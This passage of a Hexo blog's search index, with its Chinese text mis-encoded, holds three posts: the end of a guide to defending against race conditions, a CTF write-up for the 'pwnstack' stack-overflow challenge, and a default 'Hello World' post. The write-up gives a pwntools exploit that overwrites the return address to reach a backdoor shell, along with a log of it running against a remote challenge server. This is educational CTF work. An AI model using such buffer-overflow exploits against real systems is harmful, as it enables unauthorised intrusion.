é”ç¡®ä¿åŒä¸€æ—¶é—´åªæœ‰ä¸€ä¸ªçº¿ç¨‹æˆ–è¿›ç¨‹å¯ä»¥è®¿é—®å…±äº«èµ„æºã€‚<br>ä¿¡å·é‡ï¼ˆSemaphoreï¼‰ï¼šé™åˆ¶åŒæ—¶è®¿é—®èµ„æºçš„çº¿ç¨‹æˆ–è¿›ç¨‹æ•°é‡ã€‚<br>äº’æ–¥é‡ï¼ˆMutexï¼‰ï¼šç±»ä¼¼äºé”ï¼Œç”¨äºå¤šçº¿ç¨‹ç¯å¢ƒã€‚<br>(2) åŸå­æ“ä½œ<br>ä½¿ç”¨åŸå­æ“ä½œç¡®ä¿æ“ä½œçš„ä¸å¯åˆ†å‰²æ€§ã€‚<br>ç¤ºä¾‹ï¼š<br>æ•°æ®åº“ä¸­çš„äº‹åŠ¡ï¼ˆTransactionï¼‰ã€‚<br>ç¼–ç¨‹è¯­è¨€ä¸­çš„åŸå­ç±»å‹ï¼ˆå¦‚ atomic åœ¨ C++ æˆ– Java ä¸­ï¼‰ã€‚<br>(3) é¿å…å…±äº«èµ„æº<br>å°½é‡å‡å°‘å…±äº«èµ„æºçš„ä½¿ç”¨ï¼Œé‡‡ç”¨çº¿ç¨‹æœ¬åœ°å­˜å‚¨ï¼ˆThread Local Storage, TLSï¼‰æˆ–è¿›ç¨‹éš”ç¦»ã€‚<br>ç¤ºä¾‹ï¼š<br>ä½¿ç”¨çº¿ç¨‹æœ¬åœ°å˜é‡ä»£æ›¿å…¨å±€å˜é‡ã€‚<br>(4) æ–‡ä»¶æ“ä½œé˜²å¾¡<br>ä½¿ç”¨æ–‡ä»¶é”ï¼ˆFile Lockï¼‰ç¡®ä¿åŒä¸€æ—¶é—´åªæœ‰ä¸€ä¸ªè¿›ç¨‹å¯ä»¥è®¿é—®æ–‡ä»¶ã€‚<br>(5) æ•°æ®åº“æ“ä½œé˜²å¾¡<br>ä½¿ç”¨äº‹åŠ¡ï¼ˆTransactionï¼‰å’Œé”æœºåˆ¶ï¼ˆå¦‚è¡Œé”ã€è¡¨é”ï¼‰ç¡®ä¿æ•°æ®ä¸€è‡´æ€§ã€‚<br>(6) æ—¶é—´çª—å£æœ€å°åŒ–<br>å‡å°‘ç«äº‰æ¡ä»¶çš„å‘ç”Ÿæ¦‚ç‡ï¼Œå°½é‡ç¼©çŸ­å…±äº«èµ„æºçš„è®¿é—®æ—¶é—´ã€‚<br>ç¤ºä¾‹ï¼š<br>åœ¨æ–‡ä»¶æ“ä½œä¸­ï¼Œå°½å¿«é‡Šæ”¾æ–‡ä»¶é”ã€‚<br>(7) ä½¿ç”¨ä¸å¯å˜å¯¹è±¡<br>ä½¿ç”¨ä¸å¯å˜å¯¹è±¡ï¼ˆImmutable Objectsï¼‰é¿å…å…±äº«èµ„æºè¢«ä¿®æ”¹ã€‚<br>ç¤ºä¾‹ï¼š<br>åœ¨å‡½æ•°å¼ç¼–ç¨‹ä¸­ï¼Œå°½é‡ä½¿ç”¨ä¸å¯å˜æ•°æ®ç»“æ„ã€‚<br>(8) è¾“å…¥éªŒè¯å’Œè¾¹ç•Œæ£€æŸ¥<br>å¯¹ç”¨æˆ·è¾“å…¥è¿›è¡Œä¸¥æ ¼éªŒè¯ï¼Œé¿å…æ¶æ„è¾“å…¥è§¦å‘ç«äº‰æ¡ä»¶ã€‚<br>ç¤ºä¾‹ï¼š<br>æ£€æŸ¥æ–‡ä»¶è·¯å¾„ã€ç”¨æˆ·æƒé™ç­‰ã€‚<br>(9) ä»£ç å®¡æŸ¥å’Œæµ‹è¯•<br>é€šè¿‡ä»£ç å®¡æŸ¥å‘ç°æ½œåœ¨çš„ç«äº‰æ¡ä»¶ã€‚<br>ä½¿ç”¨å‹åŠ›æµ‹è¯•å’Œå¹¶å‘æµ‹è¯•å·¥å…·ï¼ˆå¦‚ JMeterã€Locustï¼‰æ¨¡æ‹Ÿé«˜å¹¶å‘åœºæ™¯ã€‚</p><p>å¸¸è§æ¡ä»¶ç«äº‰æ¼æ´ç¤ºä¾‹åŠé˜²å¾¡<br>(1) TOCTOUï¼ˆTime-of-Check to Time-of-Useï¼‰</p><div class="code-wrapper"><pre><code class="hljs c">æ¼æ´æè¿°ï¼šåœ¨æ£€æŸ¥èµ„æºçŠ¶æ€å’Œä½¿ç”¨èµ„æºä¹‹é—´å­˜åœ¨æ—¶é—´çª—å£ï¼Œæ”»å‡»è€…å¯ä»¥åˆ©ç”¨è¿™ä¸ªæ—¶é—´çª—å£ä¿®æ”¹èµ„æºçŠ¶æ€ã€‚é˜²å¾¡æ–¹æ³•ï¼š    ä½¿ç”¨åŸå­æ“ä½œï¼ˆå¦‚ open() çš„ O_EXCL æ ‡å¿—ï¼‰ã€‚    ç¤ºä¾‹ï¼ˆC è¯­è¨€ï¼‰ï¼š    c    å¤åˆ¶    <span class="hljs-type">int</span> fd = open(<span class="hljs-string">&quot;file.txt&quot;</span>, O_WRONLY | O_CREAT | O_EXCL, <span class="hljs-number">0644</span>);    <span class="hljs-keyword">if</span> (fd == <span class="hljs-number">-1</span>) &#123;        <span class="hljs-comment">// æ–‡ä»¶å·²å­˜åœ¨</span>    &#125;</code></pre></div><p>(2) æ–‡ä»¶ä¸Šä¼ æ¼æ´</p><div class="code-wrapper"><pre><code class="hljs python">æ¼æ´æè¿°ï¼šæ”»å‡»è€…åœ¨ä¸Šä¼ æ–‡ä»¶æ—¶ï¼Œåˆ©ç”¨æ—¶é—´çª—å£æ›¿æ¢æ–‡ä»¶å†…å®¹ã€‚é˜²å¾¡æ–¹æ³•ï¼š    ä½¿ç”¨ä¸´æ—¶æ–‡ä»¶ï¼Œä¸Šä¼ å®Œæˆåå†é‡å‘½åã€‚    ç¤ºä¾‹ï¼š    python    å¤åˆ¶    <span class="hljs-keyword">import</span> os    <span class="hljs-keyword">import</span> tempfile    <span class="hljs-keyword">with</span> tempfile.NamedTemporaryFile(delete=<span class="hljs-literal">False</span>) <span class="hljs-keyword">as</span> tmp_file:        tmp_file.write(<span class="hljs-string">b&quot;file content&quot;</span>)        tmp_path = tmp_file.name    os.rename(tmp_path, <span class="hljs-string">&quot;final_file.txt&quot;</span>)</code></pre></div><p>(3) å¹¶å‘ä¿®æ”¹å…±äº«å˜é‡</p><div class="code-wrapper"><pre><code class="hljs java">æ¼æ´æè¿°ï¼šå¤šä¸ªçº¿ç¨‹åŒæ—¶ä¿®æ”¹å…±äº«å˜é‡ï¼Œå¯¼è‡´æ•°æ®ä¸ä¸€è‡´ã€‚é˜²å¾¡æ–¹æ³•ï¼š    ä½¿ç”¨é”æˆ–åŸå­æ“ä½œã€‚    ç¤ºä¾‹ï¼ˆJavaï¼‰ï¼š    java    å¤åˆ¶    <span class="hljs-keyword">import</span> java.util.concurrent.atomic.AtomicInteger;    <span class="hljs-type">AtomicInteger</span> <span class="hljs-variable">sharedResource</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">AtomicInteger</span>(<span class="hljs-number">0</span>);    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">updateResource</span><span class="hljs-params">()</span> &#123;        sharedResource.incrementAndGet();    &#125;</code></pre></div><h6 id="ä¸€äº›ç´ ææ¥æºï¼š">ä¸€äº›ç´ ææ¥æºï¼š</h6><p><a href="https://noa.pages.dev/posts/web_security/race_conditions/">Noahâ€™s Blog</a></p><p><a href="https://chat.deepseek.com/">DeepSeek</a></p>]]></content>
    
    
    <categories>
      
      <category>Webå®‰å…¨</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Webå®‰å…¨</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>æ”»é˜²ä¸–ç•Œ-pwnstacké¢˜è§£</title>
    <link href="/2025/02/06/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C-pwnstack%E9%A2%98%E8%A7%A3/"/>
    <url>/2025/02/06/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C-pwnstack%E9%A2%98%E8%A7%A3/</url>
    
    <content type="html"><![CDATA[<h2 id="æ”»é˜²ä¸–ç•Œ-pwnstacké¢˜è§£">æ”»é˜²ä¸–ç•Œ-pwnstacké¢˜è§£</h2><p>è¿™æ˜¯æ–°åšå®¢çš„ç¬¬ä¸€ç¯‡æ–‡ç« ï¼Œæ„Ÿè§‰ç©ºè¡è¡çš„å°±å½“ä¸€æ¬¡éšç¬”</p><h4 id="ä¸€ã€ç®€è¿°">ä¸€ã€ç®€è¿°</h4><p>ã€é¢˜å‹ã€‘<a href>PWN</a><br>ã€é¢˜ç›®ã€‘<code>pwnstack</code><br>ã€æ¥æºã€‘[æ”»é˜²ä¸–ç•Œ](<a href="https://adworld.xctf.org.cn/challenges/list%EF%BC%89">https://adworld.xctf.org.cn/challenges/listï¼‰</a><br>ã€æ€è·¯ã€‘<a href>æ ˆæº¢å‡º</a></p><h4 id="äºŒã€æ€è·¯åŠè¿‡ç¨‹">äºŒã€æ€è·¯åŠè¿‡ç¨‹</h4><p>Step.1ï¼šå…ˆä½¿ç”¨<code>checksec</code>å’Œ<code>file</code>äº†è§£æœ‰å…³è¿™ä¸ªæ–‡ä»¶çš„ä¸€äº›ä¿¡æ¯</p><div class="code-wrapper"><pre><code class="hljs bash"><span class="hljs-comment"># zer0-r1ng @ ring0rez-Laptop in ~/Challenge/Adworld/pwnstack/[16:27:17]</span>$ checksec pwn2[*] <span class="hljs-string">&#x27;/Challenge/Adworld/pwnstack/pwn2&#x27;</span>    Arch:       amd64-64-little    RELRO:      Partial RELRO    Stack:      No canary found    NX:         NX enabled    PIE:        No PIE (0x400000)    Stripped:   No<span class="hljs-comment"># zer0-r1ng @ ring0rez-Laptop in ~/Challenge/Adworld/pwnstack/[16:30:13] C:1</span>$ file pwn2pwn2: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, <span class="hljs-keyword">for</span> GNU/Linux 2.6.32, BuildID[sha1]=62aa40d64871e142a32827b4e403772e72f67fba, not stripped</code></pre></div><p>æˆ‘ä»¬ä»ä¸­å¯ä»¥å¾—çŸ¥å®ƒæ˜¯ä¸€ä¸ª64ä½çš„ELFæ ¼å¼æ–‡ä»¶</p><p>Step.2ï¼šæ”¾å…¥IDA Proä¸­è¿›è¡Œåˆ†æ</p><div class="code-wrapper"><pre><code class="hljs c++"><span class="hljs-function"><span class="hljs-type">int</span> __fastcall <span class="hljs-title">main</span><span class="hljs-params">(<span class="hljs-type">int</span> argc, <span class="hljs-type">const</span> <span class="hljs-type">char</span> **argv, <span class="hljs-type">const</span> <span class="hljs-type">char</span> **envp)</span></span><span class="hljs-function"></span>&#123;  <span class="hljs-built_in">initsetbuf</span>(argc, argv, envp);  <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;this is pwn1,can you do that??&quot;</span>);  <span class="hljs-built_in">vuln</span>();  <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;&#125;</code></pre></div><p>åœ¨é‡Œé¢æˆ‘ä»¬å‘ç°äº†ä¸€ä¸ªéå¸¸å¯ç–‘çš„<code>puts</code> å’Œ<code>vuln</code> å‡½æ•°ï¼Œç‚¹è¿›å»çœ‹çœ‹</p><div class="code-wrapper"><pre><code class="hljs scss">__int64 <span class="hljs-built_in">vuln</span>()&#123;  char buf<span class="hljs-selector-attr">[160]</span>; <span class="hljs-comment">// [rsp+0h] [rbp-A0h] BYREF</span>  <span class="hljs-built_in">memset</span>(buf, <span class="hljs-number">0</span>, sizeof(buf));  <span class="hljs-built_in">read</span>(<span class="hljs-number">0</span>, buf, <span class="hljs-number">0</span>xB1uLL);  return <span class="hljs-number">0</span>LL;&#125;</code></pre></div><p>åœ¨vulnå‡½æ•°ä¸­æˆ‘ä»¬å¯ä»¥çœ‹åˆ°å‡½æ•°åˆ†é…äº†ä¸€ä¸ªå¤§å°ä¸º 160 å­—èŠ‚çš„ç¼“å†²åŒº <code>buf</code>ï¼Œç„¶åä½¿ç”¨ <code>read</code> å‡½æ•°ä»æ ‡å‡†è¾“å…¥ï¼ˆæ–‡ä»¶æè¿°ç¬¦ 0ï¼‰è¯»å–æ•°æ®åˆ°è¿™ä¸ªç¼“å†²åŒºä¸­ã€‚ç„¶è€Œï¼Œ<code>read</code> å‡½æ•°è¢«æŒ‡ç¤ºè¯»å–æœ€å¤š 0xB1ï¼ˆå³ 177ï¼‰å­—èŠ‚çš„æ•°æ®ï¼Œè¿™æ¯”ç¼“å†²åŒº <code>buf</code> èƒ½å¤Ÿå®¹çº³çš„å¤šï¼Œä»è€Œå¯¼è‡´äº†ç¼“å†²åŒºæº¢å‡ºçš„é£é™©ã€‚</p><p>Step.5ï¼šshift+F12æŸ¥çœ‹å­—ç¬¦ä¸²å‘ç°<code>/bin/sh</code>ï¼Œè¿›å…¥å‘ç°åé—¨å‡½æ•°ï¼ŒæŸ¥çœ‹åœ°å€ï¼ˆctr+xï¼‰å‘ç°ä¸ºï¼š<code>0x400762</code></p><div class="code-wrapper"><pre><code class="hljs c">LOAD:<span class="hljs-number">0000000000400238</span><span class="hljs-number">0000001</span>CC/lib64/ld-linux-x86<span class="hljs-number">-64.</span>so.<span class="hljs-number">2</span>LOAD:<span class="hljs-number">00000000004003B</span>9<span class="hljs-number">0000000</span>AClibc.so.<span class="hljs-number">6</span>LOAD:<span class="hljs-number">00000000004003</span>C8<span class="hljs-number">00000006</span>C<span class="hljs-built_in">stdin</span>LOAD:<span class="hljs-number">00000000004003</span>D3<span class="hljs-number">00000007</span>C<span class="hljs-built_in">stdout</span>LOAD:<span class="hljs-number">00000000004003</span>DA<span class="hljs-number">00000007</span>C<span class="hljs-built_in">stderr</span>LOAD:<span class="hljs-number">00000000004003E1</span><span class="hljs-number">00000007</span>CsystemLOAD:<span class="hljs-number">00000000004003E8</span><span class="hljs-number">00000008</span>CsetvbufLOAD:<span class="hljs-number">00000000004003F</span>0<span class="hljs-number">00000012</span>C__libc_start_mainLOAD:<span class="hljs-number">0000000000400402</span><span class="hljs-number">0000000F</span>C__gmon_start__LOAD:<span class="hljs-number">0000000000400411</span><span class="hljs-number">0000000</span>CCGLIBC_2.<span class="hljs-number">2.5</span>.rodata:<span class="hljs-number">0000000000400838</span><span class="hljs-number">00000008</span>C/bin/sh.rodata:<span class="hljs-number">0000000000400848</span><span class="hljs-number">0000001F</span>Cthis is pwn1,can you <span class="hljs-keyword">do</span> that??.eh_frame:<span class="hljs-number">000000000040091F</span><span class="hljs-number">00000006</span>C;*<span class="hljs-number">3</span>$\<span class="hljs-string">&quot;</span></code></pre></div><p>Step.6ï¼šæ„é€ expå¹¶caughtåˆ°flag</p><div class="code-wrapper"><pre><code class="hljs routeros"><span class="hljs-keyword">from</span> pwn import *<span class="hljs-attribute">p</span>=remote(&quot;Host&quot;,Port)<span class="hljs-attribute">payload</span>=b&#x27;a&#x27;*0xa8+p64(0x400762)p.sendline(payload)p.interactive()</code></pre></div><p>åœ¨ä¸Šé¢çš„expä»£ç ä¸­ä½¿ç”¨äº†<code>pwntools</code>åº“å¹¶è¿æ¥åˆ°è¿œç¨‹æœåŠ¡å™¨ï¼Œéšåæˆ‘ä»¬æ„é€ äº†ä¸€ä¸ªé•¿åº¦ä¸ºâ€0xa8â€œå¹¶ç”¨â€™aâ€™å»å¡«å……å’Œç±»å‹ä¸ºäºŒè¿›åˆ¶æ•°æ®çš„payloadï¼Œå¹¶è¦†ç›–è¿”å›åœ°å€åˆ°<code>0x400762</code>å¹¶å°†è¿”å›åœ°å€è½¬æ¢ä¸ºå°ç«¯åºçš„64ä½è¿›è¡Œè¡¨ç¤º</p><div class="code-wrapper"><pre><code class="hljs bash">zer0-r1ng @ ring0rez-Laptop <span class="hljs-keyword">in</span> ~/Challenge/Adworld/pwnstack/[16:50:22]$ python3 exp.py[+] Opening connection to 61.147.171.105 on port 54428: Done[*] Switching to interactive modethis is pwn1,can you <span class="hljs-keyword">do</span> that??$ <span class="hljs-built_in">ls</span>bindevflagliblib32lib64pwn2$ <span class="hljs-built_in">cat</span> flagcyberpeace&#123;9d0526386a432e6fcf65858cd1ee804d&#125;</code></pre></div><script src="https://giscus.app/client.js" data-repo="solkatt-cn/solkatt-cn.github.io" data-repo-id="R_kgDONzaTTQ" data-category="Announcements" data-category-id="DIC_kwDONzaTTc4Cpqn7" data-mapping="pathname" data-strict="0" data-reactions-enabled="1" data-emit-metadata="0" data-input-position="top" data-theme="preferred_color_scheme" data-lang="zh-CN" crossorigin="anonymous" async></script>]]></content>
    
    
    <categories>
      
      <category>CTF</category>
      
    </categories>
    
    
    <tags>
      
      <tag>CTF</tag>
      
      <tag>PWN</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Hello World</title>
    <link href="/2025/02/05/hello-world/"/>
    <url>/2025/02/05/hello-world/</url>
    
    <content type="html"><![CDATA[<p>Welcome to <a href="https://hexo.io/">Hexo</a>! This is your very first post. Check <a href="https://hexo.io/docs/">documentation</a> for more info. If you get any problems when using Hexo, you can find the answer in <a href="https://hexo.io/docs/troubleshooting.html">troubleshooting</a> or you can ask me on <a href="https://github.com/hexojs/hexo/issues">GitHub</a>.</p><h2 id="Quick-Start">Quick Start</h2><h3 id="Create-a-new-post">Create a new post</h3><div class="code-wrapper"><pre><code class="hljs bash">$ hexo new <span class="hljs-string">&quot;My New Post&quot;</span></code></pre></div><p>More info: <a href="https://hexo.io/docs/writing.html">Writing</a></p><h3 id="Run-server">Run server</h3><div class="code-wrapper"><pre><code class="hljs bash">$ hexo server</code></pre></div><p>More info: <a href="https://hexo.io/docs/server.html">Server</a></p><h3 id="Generate-static-files">Generate static files</h3><div class="code-wrapper"><pre><code class="hljs bash">$ hexo generate</code></pre></div><p>More info: <a href="https://hexo.io/docs/generating.html">Generating</a></p><h3 id="Deploy-to-remote-sites">Deploy to remote sites</h3><div class="code-wrapper"><pre><code class="hljs bash">$ hexo deploy</code></pre></div><p>More info: <a href="https://hexo.io/docs/one-command-deployment.html">Deployment</a></p><script src="https://giscus.app/client.js" data-repo="solkatt-cn/solkatt-cn.github.io" data-repo-id="R_kgDONzaTTQ" data-category="Announcements" data-category-id="DIC_kwDONzaTTc4Cpqn7" data-mapping="pathname" data-strict="0" data-reactions-enabled="1" data-emit-metadata="0" data-input-position="top" data-theme="preferred_color_scheme" data-lang="zh-CN" crossorigin="anonymous" async></script>]]></content>
    
    
    
  </entry>
  
  
  
  
</search>
